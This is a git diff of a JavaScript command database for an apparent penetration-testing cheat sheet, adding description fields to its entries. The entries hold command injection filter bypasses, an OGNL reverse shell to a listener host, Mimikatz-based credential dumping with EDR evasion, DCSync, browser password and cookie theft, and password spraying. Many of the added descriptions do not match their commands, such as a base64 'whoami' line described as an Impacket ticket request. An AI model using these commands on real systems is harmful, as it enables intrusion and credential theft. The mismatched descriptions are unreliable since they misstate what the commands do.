-          "command": "http://<ip>:<port>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder="
+          "command": "http://<ip>:<port>/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=",
+          "description": "Vulnerable FCKeditor upload endpoint (manual confirmation). See the command syntax for exact parameters and flags."
         }
       ],
       "examples": [
@@ -20136,11 +20257,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows PowerShell",
-          "command": "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\niex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\""
+          "command": "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))\niex \"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))\"",
+          "description": "Uses Impacket getST to request a Kerberos Service Ticket (TGS) for a specific SPN. Used in constrained delegation attacks, S4U abuse, and service ticket manipulation."
         },
         {
           "label": "Linux -> Windows (UTF-16LE)",
-          "command": "echo -n whoami | iconv -f utf-8 -t utf-16le | base64"
+          "command": "echo -n whoami | iconv -f utf-8 -t utf-16le | base64",
+          "description": "Linux -> Windows (UTF-16LE). See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "loud",
@@ -20375,11 +20498,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux - tr",
-          "command": "$(tr \"[A-Z]\" \"[a-z]\"<<<\"WhOaMi\")"
+          "command": "$(tr \"[A-Z]\" \"[a-z]\"<<<\"WhOaMi\")",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         },
         {
           "label": "Linux - parameter expansion",
-          "command": "$(a=\"WhOaMi\";printf %s \"${a,,}\")"
+          "command": "$(a=\"WhOaMi\";printf %s \"${a,,}\")",
+          "description": "Linux - parameter expansion. See the command syntax for exact parameters and flags."
         }
       ],
       "opsec": "loud",
@@ -20615,19 +20740,23 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Linux - semicolon from LS_COLORS",
-          "command": "echo ${LS_COLORS:10:1}   # -> ;\n127.0.0.1${LS_COLORS:10:1}${IFS}"
+          "command": "echo ${LS_COLORS:10:1}   # -> ;\n127.0.0.1${LS_COLORS:10:1}${IFS}",
+          "description": "Linux - semicolon from LS_COLORS. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Windows CMD",
-          "command": "echo %HOMEPATH:~6,-11%   # -> \\"
+          "command": "echo %HOMEPATH:~6,-11%   # -> \\",
+          "description": "Writes text to a file or stdout for various post-exploitation purposes (persistence, payload deployment, or file manipulation)."
         },
         {
           "label": "Windows PowerShell",
-          "command": "$env:HOMEPATH[0]\n$env:PROGRAMFILES[10]"
+          "command": "$env:HOMEPATH[0]\n$env:PROGRAMFILES[10]",
+          "description": "Reference table of hashcat mode numbers for Windows and Active Directory hash types. Covers NTLM, NetNTLMv1/v2, DCC, and Kerberos ticket formats."
         },
         {
           "label": "Linux - character shifting (tr)",
-          "command": "# tr maps '!-}' -> '\"~' (each char shifted +1 in ASCII)\n# Find the char BEFORE your target in the ASCII table (man ascii), then pass it to tr\n# \\ is ASCII 92; [ is ASCII 91 -> output is \\\necho "
+          "command": "# tr maps '!-}' -> '\"~' (each char shifted +1 in ASCII)\n# Find the char BEFORE your target in the ASCII table (man ascii), then pass it to tr\n# \\ is ASCII 92; [ is ASCII 91 -> output is \\\necho ",
+          "description": "Lists active network connections and listening ports. Identifies internal services, database connections, and potential pivoting targets not visible from external scans."
         }
       ],
       "opsec": "loud",
@@ -20862,15 +20991,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Quotes (Linux & Windows)",
-          "command": "w'h'o'am'i\nw\"h\"o\"am\"i"
+          "command": "w'h'o'am'i\nw\"h\"o\"am\"i",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         },
         {
           "label": "Linux - $@ / backslash",
-          "command": "who$@ami\nw\\ho\\am\\i"
+          "command": "who$@ami\nw\\ho\\am\\i",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         },
         {
           "label": "Windows - caret",
-          "command": "who^ami"
+          "command": "who^ami",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         }
       ],
       "opsec": "loud",
@@ -21301,11 +21433,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Operators",
-          "command": "; whoami   |   && whoami   |   | whoami   |   `whoami`   |   $(whoami)"
+          "command": "; whoami   |   && whoami   |   | whoami   |   `whoami`   |   $(whoami)",
+          "description": "Reference of command injection separator characters and operators. Each operator (;, &&, |, backticks, $()) provides a different way to chain injected commands in vulnerable applications."
         },
         {
           "label": "Newline / time-based blind",
-          "command": "%0a whoami   |   ; ping -c 5 <attacker>"
+          "command": "%0a whoami   |   ; ping -c 5 <attacker>",
+          "description": "Newline / time-based blind. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -21406,15 +21540,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Both commands",
-          "command": "; -> %3b   (semicolon, runs both)\n\\n -> %0a   (newline, runs both)\n& -> %26   (background; second output shown first)\n&& -> %26%26  (AND; second runs only if first succeeds)"
+          "command": "; -> %3b   (semicolon, runs both)\n\\n -> %0a   (newline, runs both)\n& -> %26   (background; second output shown first)\n&& -> %26%26  (AND; second runs only if first succeeds)",
+          "description": "URL-encoded versions of command injection operators for bypassing WAF and input filters. When raw operators (;, newline, &) are blocked, their URL-encoded equivalents may pass through to the backend shell."
         },
         {
           "label": "Conditional / pipe",
-          "command": "| -> %7c    (pipe; only second output shown)\n|| -> %7c%7c (OR; second runs only if first fails)"
+          "command": "| -> %7c    (pipe; only second output shown)\n|| -> %7c%7c (OR; second runs only if first fails)",
+          "description": "Conditional / pipe. See the command syntax for exact usage and parameters."
         },
         {
           "label": "Sub-shell (Linux only)",
-          "command": "`` -> %60%60      (backticks)\n$() -> %24%28%29   (dollar-paren)"
+          "command": "`` -> %60%60      (backticks)\n$() -> %24%28%29   (dollar-paren)",
+          "description": "Sub-shell (Linux only). See the command syntax for exact usage and parameters."
         }
       ],
       "opsec": "moderate",
@@ -21498,7 +21635,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Windows PowerShell",
-          "command": "\"whoami\"[-1..-20] -join ''\niex \"$('imaohw'[-1..-20] -join '')\""
+          "command": "\"whoami\"[-1..-20] -join ''\niex \"$('imaohw'[-1..-20] -join '')\"",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         }
       ],
       "opsec": "loud",
@@ -21728,11 +21866,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "IFS variable",
-          "command": "127.0.0.1%0a${IFS}whoami"
+          "command": "127.0.0.1%0a${IFS}whoami",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         },
         {
           "label": "Brace expansion",
-          "command": "127.0.0.1%0a{ls,-la}"
+          "command": "127.0.0.1%0a{ls,-la}",
+          "description": "OS command injection bypass payload using obfuscation or encoding techniques. Evades input filters and WAFs by encoding, splitting, or transforming the injected command."
         }
       ],
       "opsec": "loud",
@@ -21907,12 +22047,14 @@ const COMMAND_DATA = {
         {
           "command": "curl http://<target>:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%27bash%27%2C%27-c%27%2C%27bash+-i+>%26+/dev/tcp/<lhost>/<lport>+0>%261%27%7D%29.start%28%29%22%29%7D/",
           "caption": "Reverse shell via OGNL (bash -i)",
-          "label": "GET request"
+          "label": "GET request",
+          "description": "Java reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
         },
         {
           "command": "python3 -c \"import urllib.parse; payload = \\\"new java.lang.ProcessBuilder(['id']).start()\\\"; print(urllib.parse.quote('${new javax.script.ScriptEngineManager().getEngineByName(\\\"nashorn\\\").eval(\\\"' + payload + '\\\")}'))\"",
           "caption": "Python helper to URL-encode custom OGNL payload",
-          "label": "python3"
+          "label": "python3",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "steps": [
@@ -22195,15 +22337,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "AD Module: find constrained delegation targets",
-          "command": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo"
+          "command": "Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \"$null\"} -Properties msDS-AllowedToDelegateTo",
+          "description": "AD Module: find constrained delegation targets. See the command syntax for exact parameters and flags."
         },
         {
           "label": "S4U with /altservice swap (e.g. time -> ldap for DCSync)",
-          "command": "Rubeus.exe s4u /user:<user> /aes256:<key> /impersonateuser:Administrator /msdsspn:time/<dc_host> /altservice:ldap /ptt"
+          "command": "Rubeus.exe s4u /user:<user> /aes256:<key> /impersonateuser:Administrator /msdsspn:time/<dc_host> /altservice:ldap /ptt",
+          "description": "Uses Rubeus for S4U (Service-for-User) Kerberos extension abuse. Performs constrained delegation attacks by requesting tickets on behalf of other users to access target services."
         },
         {
           "label": "DCSync after LDAP service swap",
-          "command": "SafetyKatz.exe \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\""
+          "command": "SafetyKatz.exe \"lsadump::evasive-dcsync /user:<domain>\\krbtgt\" \"exit\"",
+          "description": "Performs DCSync through an evasive loader to extract password hashes from the domain controller by simulating replication. The loader wraps Mimikatz to evade endpoint detection."
         }
       ],
       "recommended": [
@@ -22633,7 +22778,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Enumerate CORS on many endpoints (spot the reflective ones)",
-          "command": "for e in account profile orders admin; do echo \"/$e:\"; curl -s -I -H 'Origin: https://evil.com' https://<target>/api/$e | grep -i access-control-allow-origin; done"
+          "command": "for e in account profile orders admin; do echo \"/$e:\"; curl -s -I -H 'Origin: https://evil.com' https://<target>/api/$e | grep -i access-control-allow-origin; done",
+          "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
         }
       ],
       "defense": {
@@ -23233,7 +23379,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec (successor)",
-          "command": "nxc smb <dc_ip> -u <user> -p <password> --groups"
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --groups",
+          "description": "Uses CrackMapExec to enumerate domain groups and their members via SMB. Identifies privileged group memberships for targeting."
         }
       ],
       "explain": "Enumerates domain groups over SMB with CrackMapExec:\n  crackmapexec smb <dc_ip>   authenticate to the DC's SMB service\n  -u/-p                      valid domain credentials\n  --groups                   list all domain groups and their member counts\nQuickly surfaces high-value groups (Domain/Enterprise Admins, Backup Operators) worth targeting; nxc is the maintained rename of the same tool."
@@ -23426,11 +23573,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec",
-          "command": "nxc smb <dc_ip> -u <user> -p <password> --users"
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --users",
+          "description": "Uses CrackMapExec to enumerate domain users via SMB. A quick way to get a user list for password spraying or account analysis."
         },
         {
           "label": "RID brute (null/guest)",
-          "command": "crackmapexec smb <dc_ip> -u guest -p '' --rid-brute"
+          "command": "crackmapexec smb <dc_ip> -u guest -p '' --rid-brute",
+          "description": "Uses CrackMapExec to brute-force RID values over SMB, enumerating domain users and groups. Works with null sessions or guest access when other enumeration is blocked."
         }
       ],
       "steps": [
@@ -23615,7 +23764,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec + filter readable",
-          "command": "nxc smb <dc_ip> -u <user> -p <password> --shares"
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --shares",
+          "description": "Uses CrackMapExec to enumerate accessible SMB shares on target hosts. Lists shares and your permission level (READ/WRITE) - identifies data access and potential write targets for payload deployment."
         }
       ],
       "explain": "Lists accessible SMB shares with read/write flags:\n  crackmapexec smb <dc_ip>   target host\n  -u/-p                      valid credentials\n  --shares                   enumerate shares and your access level on each\nFinds non-default shares to hunt for credentials; sweep a subnet and grep out 'NO ACCESS', then dig into writable/interesting shares with smbmap or spider_plus."
@@ -23796,11 +23946,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Search SYSVOL for cpassword",
-          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> -M gpp_password"
+          "command": "crackmapexec smb <dc_ip> -u <user> -p <password> -M gpp_password",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         },
         {
           "label": "PowerView Get-GPPAutologon",
-          "command": "Get-GPPAutologon"
+          "command": "Get-GPPAutologon",
+          "description": "PowerView Get-GPPAutologon. See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Hunts SYSVOL for autologon credentials stored in plaintext by Group Policy Preferences:\n  crackmapexec smb <dc_ip>  connect to the DC's SYSVOL over SMB\n  -u <user> -p <password>  authenticate as any domain user\n  -M gpp_autologin         parse GPP registry.pol for DefaultUserName/DefaultPassword autologon values\nUnlike cpassword these are stored in cleartext; -M gpp_password finds the encrypted cpassword variant instead."
@@ -23975,15 +24127,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec",
-          "command": "nxc smb <target> -u <user> -p <password> --loggedon-users"
+          "command": "nxc smb <target> -u <user> -p <password> --loggedon-users",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         },
         {
           "label": "qwinsta - native session enum (from a foothold)",
-          "command": "qwinsta /server:<target>"
+          "command": "qwinsta /server:<target>",
+          "description": "Uses the native Windows qwinsta command to enumerate terminal/RDP sessions on a remote server. Built-in tool that works without importing external modules - shows active, disconnected, and listening sessions."
         },
         {
           "label": "query user / quser - who is logged on",
-          "command": "query user /server:<target>"
+          "command": "query user /server:<target>",
+          "description": "Uses the native Windows query user command to show who is logged into a remote machine. Built-in alternative to PowerView session enumeration - shows username, session type, idle time, and logon time."
         }
       ],
       "explain": "Finds who is currently logged on to a host via SMB:\n  crackmapexec smb <target>   connect to the target's SMB service\n  -u/-p                       valid domain credentials\n  --loggedon-users            call NetWkstaUserEnum to list active sessions\nReveals where privileged users have live sessions so you can target that host for lateral movement or credential theft; sweep a /23 and grep for 'admin' or 'Pwn3d'."
@@ -24158,15 +24313,18 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec",
-          "command": "nxc smb <dc_ip> -u <user> -p <password> --pass-pol"
+          "command": "nxc smb <dc_ip> -u <user> -p <password> --pass-pol",
+          "description": "Uses CrackMapExec to retrieve the domain password policy via SMB. Shows lockout threshold, minimum length, and complexity requirements - essential information before password spraying."
         },
         {
           "label": "Null session",
-          "command": "crackmapexec smb <dc_ip> -u '' -p '' --pass-pol"
+          "command": "crackmapexec smb <dc_ip> -u '' -p '' --pass-pol",
+          "description": "Uses CrackMapExec to retrieve the domain password policy via SMB. Shows lockout threshold, minimum length, and complexity requirements - essential information before password spraying."
         },
         {
           "label": "PowerView - Get-DomainPolicy (password policy from LDAP)",
-          "command": "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess"
+          "command": "Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess",
+          "description": "Uses PowerView to dump domain password and Kerberos policies. Shows password complexity requirements, lockout thresholds, and ticket lifetimes - critical for planning brute-force, spraying, and ticket-based attacks."
         }
       ],
       "explain": "Reads the domain password policy over SMB:\n  crackmapexec smb <dc_ip>   query the DC\n  -u/-p                      credentials (a null session '' '' sometimes works)\n  --pass-pol                 return lockout threshold, window, complexity, min length\nRun this BEFORE any password spray so you stay under the lockout threshold and do not lock accounts."
@@ -24354,7 +24512,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec local-auth PtH sweep",
-          "command": "nxc smb <cidr> --local-auth -u administrator -H <nt_hash>"
+          "command": "nxc smb <cidr> --local-auth -u administrator -H <nt_hash>",
+          "description": "Authenticates using local (SAM) credentials instead of domain credentials. Tests whether a local admin password or hash works on target machines."
         }
       ],
       "steps": [
@@ -24571,7 +24730,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec + continue on success",
-          "command": "nxc smb <dc_ip> -u <userlist> -p <password> --continue-on-success | grep +"
+          "command": "nxc smb <dc_ip> -u <userlist> -p <password> --continue-on-success | grep +",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         }
       ],
       "steps": [
@@ -24763,7 +24923,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "NetExec spider_plus",
-          "command": "nxc smb <dc_ip> -u <user> -p <password> -M spider_plus -o READ_ONLY=false"
+          "command": "nxc smb <dc_ip> -u <user> -p <password> -M spider_plus -o READ_ONLY=false",
+          "description": "Uses CrackMapExec for password spraying - testing a single password against multiple user accounts. Respects lockout policies by using one password per spray round."
         }
       ],
       "steps": [
@@ -25034,27 +25195,33 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Kerberos AES keys (for overpass-the-hash)",
-          "command": "SafetyKatz.exe \"sekurlsa::ekeys\" \"exit\""
+          "command": "SafetyKatz.exe \"sekurlsa::ekeys\" \"exit\"",
+          "description": "Extracts Kerberos encryption keys (AES256, AES128, RC4/NTLM) from LSASS via an evasive loader. These keys are used for forging Kerberos tickets (Golden/Silver/Diamond tickets)."
         },
         {
           "label": "Evasive keys via Loader (in-memory)",
-          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-keys\" \"exit\""
+          "command": "Loader.exe -path <safetykatz_exe> -args \"sekurlsa::evasive-keys\" \"exit\"",
+          "description": "Runs a Mimikatz operation through an evasive loader (e.g., SafetyKatz) to bypass antivirus and EDR detections that would flag direct Mimikatz execution."
         },
         {
           "label": "Local SAM hashes",
-          "command": "SafetyKatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\""
+          "command": "SafetyKatz.exe \"token::elevate\" \"lsadump::sam\" \"exit\"",
+          "description": "Extracts password hashes from the local SAM database. Dumps NTLM hashes for all local user accounts on the machine."
         },
         {
           "label": "DPAPI vault / Credential Manager creds",
-          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'"
+          "command": "Invoke-Mimi -Command '\"token::evasive-elevate\" \"vault::cred /patch\"'",
+          "description": "DPAPI vault / Credential Manager creds. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Register malicious SSP (plaintext capture persistence)",
-          "command": "Invoke-Mimikatz -Command '\"misc::memssp\"'   # logons -> C:\\Windows\\System32\\mimilsa.log"
+          "command": "Invoke-Mimikatz -Command '\"misc::memssp\"'   # logons -> C:\\Windows\\System32\\mimilsa.log",
+          "description": "Runs Mimikatz operations via reflective PowerShell loading - executes entirely in memory without writing to disk."
         },
         {
           "label": "evasive-lsa dump (SafetyKatz)",
-          "command": "SafetyKatz.exe \"sekurlsa::evasive-lsa /patch\" \"exit\""
+          "command": "SafetyKatz.exe \"sekurlsa::evasive-lsa /patch\" \"exit\"",
+          "description": "Patches LSASS to dump credentials via an evasive loader. Modifies LSASS in memory to extract stored secrets while avoiding detection of standard Mimikatz on disk."
         }
       ],
       "explain": "Dumps credentials from LSASS memory with SafetyKatz (a minidump-based Mimikatz):\n  SafetyKatz.exe            run the packed Mimikatz\n  \"sekurlsa::logonpasswords\"   extract plaintext passwords, NTLM hashes, and Kerberos material for logged-on sessions\n  \"exit\"                    quit cleanly\nSwap the command for sekurlsa::ekeys (AES keys for overpass-the-hash), sekurlsa::tickets /export, or lsadump::sam (local SAM). Requires local admin/SeDebug."
@@ -25256,7 +25423,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Cookies too",
-          "command": ".\\SharpChrome.exe cookies /unprotect"
+          "command": ".\\SharpChrome.exe cookies /unprotect",
+          "description": "Extracts saved passwords, cookies, and browsing data from Google Chrome. Decrypts Chrome's credential store using DPAPI keys from the current user context."
         }
       ],
       "explain": "Decrypts saved Chrome passwords using the current user's DPAPI keys:\n  .\\SharpChrome.exe logins   read Chrome's Login Data and decrypt it\n  /unprotect               use the logged-on user's DPAPI master key to reveal plaintext site passwords\nRun in the victim's context. cookies /unprotect grabs session cookies too (for session hijacking)."
@@ -25650,7 +25818,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "hashcat mode 13400",
-          "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
+          "command": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt",
+          "description": "Cracks password hashes with hashcat (mode 13400) using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         }
       ],
       "steps": [
@@ -25850,7 +26019,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "One-liner",
-          "command": "(Import-Clixml '<cred_xml>').GetNetworkCredential().Password"
+          "command": "(Import-Clixml '<cred_xml>').GetNetworkCredential().Password",
+          "description": "Reads PowerShell credentials stored in an encrypted XML file. If the DPAPI key is available (same user context), the password is decrypted automatically."
         }
       ],
       "steps": [
@@ -26042,11 +26212,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Only browsers",
-          "command": ".\\lazagne.exe browsers"
+          "command": ".\\lazagne.exe browsers",
+          "description": "Runs LaZagne to extract stored passwords from web browsers. Recovers saved credentials from Chrome, Firefox, Edge, and other browsers on the target."
         },
         {
           "label": "Write to file",
-          "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public"
+          "command": ".\\lazagne.exe all -oN -output C:\\Users\\Public",
+          "description": "Runs LaZagne to extract stored credentials from all supported applications. Harvests passwords from browsers, email clients, databases, sysadmin tools, and WiFi profiles on the compromised host."
         }
       ],
       "explain": "Recovers locally stored application passwords in one run:\n  .\\lazagne.exe all        run every module (browsers, mail clients, Wi-Fi, RDP, databases, and more)\nEach module reads its app's own credential store in the current user's context; use browsers to scope it, or -oN -output to write results to a file."
@@ -26253,7 +26425,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All users' history",
-          "command": "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | gc"
+          "command": "Get-ChildItem C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | gc",
+          "description": "Lists files in user profile directories. User home folders contain browser data, SSH keys, credential files, and application configs with stored passwords."
         }
       ],
       "explain": "Reads the PSReadLine history file, which often holds passwords typed on the command line:\n  gc (Get-PSReadLineOption).HistorySavePath   print your own console history\nThe variation reads every user's ConsoleHost_history.txt under C:\\Users\\*\\...\\PSReadline\\ - credentials passed as arguments to scripts/cmdlets frequently sit there in cleartext."
@@ -26327,11 +26500,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "PuTTY sessions",
-          "command": "reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions"
+          "command": "reg query HKCU\\SOFTWARE\\SimonTatham\\PuTTY\\Sessions",
+          "description": "Queries Windows registry keys for stored configuration and potential credentials. Registry often contains passwords, service account details, and exploitable settings."
         },
         {
           "label": "Wi-Fi passwords",
-          "command": "netsh wlan show profile\nnetsh wlan show profile <SSID> key=clear"
+          "command": "netsh wlan show profile\nnetsh wlan show profile <SSID> key=clear",
+          "description": "Shows the current user's UID, GID, and group memberships. Quick check of your privilege level and which groups grant additional access (docker, sudo, adm, etc.)."
         }
       ],
       "opsec": "loud",
@@ -26638,11 +26813,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Recursive across the drive",
-          "command": "findstr /S /I /M /C:\"password\" C:\\*.txt C:\\*.ini C:\\*.config C:\\*.xml"
+          "command": "findstr /S /I /M /C:\"password\" C:\\*.txt C:\\*.ini C:\\*.config C:\\*.xml",
+          "description": "Recursive across the drive. See the command syntax for exact parameters and flags."
         },
         {
           "label": "Registry passwords",
-          "command": "reg query HKLM /f password /t REG_SZ /s"
+          "command": "reg query HKLM /f password /t REG_SZ /s",
+          "description": "Queries Windows registry keys for stored configuration and potential credentials. Registry often contains passwords, service account details, and exploitable settings."
         }
       ],
       "explain": "Greps the Windows filesystem for credentials in config and script files:\n  findstr /S               recurse into subdirectories\n  /I                       case-insensitive\n  /M                       print only matching filenames\n  /C:\"password\"           the literal string to find\n  *.txt *.ini *.cfg *.config *.xml   the file types to scan\nAlso hunt by name/extension (.rdp, .vnc, unattend.xml, web.config) and reg query HKLM /f password /t REG_SZ /s for registry-stored secrets."
@@ -26830,11 +27007,13 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "All hosts in the domain",
-          "command": "Invoke-SessionGopher -AllDomain -o"
+          "command": "Invoke-SessionGopher -AllDomain -o",
+          "description": "Searches for saved session information from PuTTY, WinSCP, FileZilla, RDP, and other tools. Extracts stored credentials and connection details from remote administration tools."
         },
         {
           "label": "Thorough (search filesystem too)",
-          "command": "Invoke-SessionGopher -Thorough"
+          "command": "Invoke-SessionGopher -Thorough",
+          "description": "Thorough (search filesystem too). See the command syntax for exact parameters and flags."
         }
       ],
       "explain": "Extracts saved remote-session secrets from the registry and profiles:\n  Invoke-SessionGopher     harvest stored credentials for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP\n  -Target <hostname>       run against this host\nMany of these tools store connection passwords recoverably; -AllDomain sweeps every domain host, -Thorough also searches the filesystem for key/session files."
@@ -27045,7 +27224,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Locate the DB first",
-          "command": "gci C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite"
+          "command": "gci C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite",
+          "description": "Lists files in user profile directories. User home folders contain browser data, SSH keys, credential files, and application configs with stored passwords."
         }
       ],
       "explain": "Reads Windows Sticky Notes content, where users often keep passwords:\n  Invoke-SqliteQuery       PSSQLite query helper\n  -Database $db            the plum.sqlite notes database\n  -Query \"SELECT Text FROM Note\"   pull every note's text\n  | ft -wrap               display it fully\nLocate the DB under C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\, or just run strings on the -wal file."
@@ -27240,7 +27420,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Reuse the saved credential",
-          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\""
+          "command": "runas /savecred /user:<domain>\\<user> \"cmd /c <command>\"",
+          "description": "Reuse the saved credential. See the command syntax for exact parameters and flags."
         }
       ],
       "steps": [
@@ -27432,7 +27613,8 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "Domain user descriptions (PowerView)",
-          "command": "Get-DomainUser -Properties samaccountname,description | ?{$_.description} | select samaccountname,description"
+          "command": "Get-DomainUser -Properties samaccountname,description | ?{$_.description} | select samaccountname,description",
+          "description": "Uses PowerView to enumerate domain user accounts with specific property filters for targeted reconnaissance."
         }
       ],
       "steps": [
@@ -28301,37 +28483,44 @@ const COMMAND_DATA = {
         {
           "command": "crunch 6 6 -t Lab%%% -o lab-wordlist.txt",
           "caption": "PEN-200 style: 'Lab' + 3 digits (Lab000-Lab999)",
-          "label": "Pattern: Lab%%%"
+          "label": "Pattern: Lab%%%",
+          "description": "Generates a custom wordlist with crunch using a pattern template. Creates passwords matching a specific format (e.g., Company@YYYY, name####) for targeted password attacks."
         },
         {
           "command": "crunch 8 8 0123456789 -o digits8.txt",
           "caption": "All 8-digit numeric passwords",
-          "label": "8-digit numeric"
+          "label": "8-digit numeric",
+          "description": "Generates a custom wordlist with crunch based on character sets and length specifications. Creates targeted password lists for brute-force attacks."
         },
         {
           "command": "crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o alphanum6.txt",
           "caption": "6-char alphanumeric (lowercase + digits)",
-          "label": "6-char alphanumeric"
+          "label": "6-char alphanumeric",
+          "description": "Generates a custom wordlist with crunch based on character sets and length specifications. Creates targeted password lists for brute-force attacks."
         },
         {
           "command": "crunch 10 10 -t Company%%%^ -o company-pass.txt",
           "caption": "Pattern: 'Company' + 3 digits + 1 symbol",
-          "label": "Pattern: Company%%%^"
+          "label": "Pattern: Company%%%^",
+          "description": "Generates a custom wordlist with crunch using a pattern template. Creates passwords matching a specific format (e.g., Company@YYYY, name####) for targeted password attacks."
         },
         {
           "command": "crunch 4 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o mixed.txt",
           "caption": "Use built-in charset file for mixed alphanumeric 4-8 chars",
-          "label": "charset.lst (mixalpha-num)"
+          "label": "charset.lst (mixalpha-num)",
+          "description": "Charset.lst (mixalpha-num). See the command syntax for exact parameters and flags."
         },
         {
           "command": "crunch 6 6 -t Lab%%% | hashcat -m 0 <hash_file> --stdin",
           "caption": "Pipe directly to hashcat (no disk write)",
-          "label": "Pipe -> hashcat"
+          "label": "Pipe -> hashcat",
+          "description": "Cracks password hashes with hashcat (mode 0) using GPU acceleration. Supports wordlists, rules, masks, and hybrid attacks for maximum cracking efficiency."
         },
         {
           "command": "crunch 6 6 -t Lab%%% | hydra -l admin -P - ssh://<target>",
